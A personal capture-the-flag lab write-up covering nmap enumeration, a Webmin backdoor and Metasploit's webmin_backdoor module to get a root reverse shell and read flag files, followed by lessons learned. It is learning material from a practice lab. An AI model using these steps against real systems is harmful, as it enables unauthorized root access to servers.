---
dg-publish: true
---
# Enumeration and Exploit
1) NMAP target machine
	1) `nmap -sV -p- (IPADDRESS)`
	2) ![[Source NMAP Scan.png]]
2) Browse to the specific port
	1) ![[Source Admin Login.png]]
3) Browse Vuln DB to see if there are any Webmin exploits
	1) Critical backdoor using MSF
4) Search and select exploit in MSF
	1) `search webmin_backdoor
	2) `use 0` or whatever number it is for you
5) Use `show options` to see what is required for the exploit
	1) `set RHOST (IP Address), set LHOST tun0, set SSL true`
	2) Type and enter `run`
6) Once the reverse shell appears confirm you are root
	1) `whoami = root`
7) Browsing does not work, but you can still use `ls` and `cat` to explore the typical location so the user and root flags
	1) `cat /root/root.txt`
	2) `ls /home/`

Things I Learned
- If you are receiving errors using msf about not being able to confirm the exploitability make sure the host is still up and active. Had to restart the lab room to complete the challenge.
- If browsing doesn't work still check the other commands such as `cat` and `ls` to see what else might be possible. You do not necessarily need to browse to the location of the flag if you know where it is. 
- Proper capitalization is critical when using Linux commands